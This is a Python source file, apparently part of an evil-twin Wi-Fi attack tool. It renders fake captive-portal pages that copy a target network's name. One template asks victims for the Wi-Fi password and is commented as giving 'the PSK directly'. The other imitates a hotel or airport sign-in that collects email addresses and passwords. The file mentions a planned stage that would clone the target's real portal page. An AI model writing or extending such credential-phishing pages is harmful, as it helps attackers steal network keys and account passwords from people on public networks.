"""Generic captive-portal page templates: the fallback until the real-portal clone-fetch
(Stage 2b, not built yet) can hand back the target's actual page.
"""
from __future__ import annotations

import enum
from html import escape

_STYLE = ("body{font-family:-apple-system,sans-serif;max-width:22em;margin:3em auto;padding:0 1em}"
         "input{width:100%;padding:.6em;margin:.5em 0;box-sizing:border-box}"
         "button{width:100%;padding:.7em;background:#0071e3;color:#fff;border:0;border-radius:6px}")


class PortalTemplate(enum.Enum):
    PASSWORD = "password"     # "enter this network's WiFi password" - gives the PSK directly
    LOGIN = "login"            # generic hotel/airport-style email + password


def render(template: PortalTemplate, ssid: str) -> str:
    name = escape(ssid)
    if template is PortalTemplate.PASSWORD:
        fields = ('<input type="password" name="password" placeholder="Wi-Fi password" '
                 'required autofocus>')
        prompt, button = "Enter the network password to continue.", "Join"
    else:
        fields = ('<input type="email" name="email" placeholder="Email address" required autofocus>'
                  '<input type="password" name="password" placeholder="Password" required>')
        prompt, button = "Sign in to connect to the internet.", "Connect"
    return (f'<!doctype html><html><head><meta charset="utf-8">'
           f'<meta name="viewport" content="width=device-width,initial-scale=1">'
           f'<title>{name} - Sign in</title><style>{_STYLE}</style></head>'
           f'<body><h2>{name}</h2><p>{prompt}</p>'
           f'<form method="post">{fields}<button type="submit">{button}</button></form>'
           f'</body></html>')
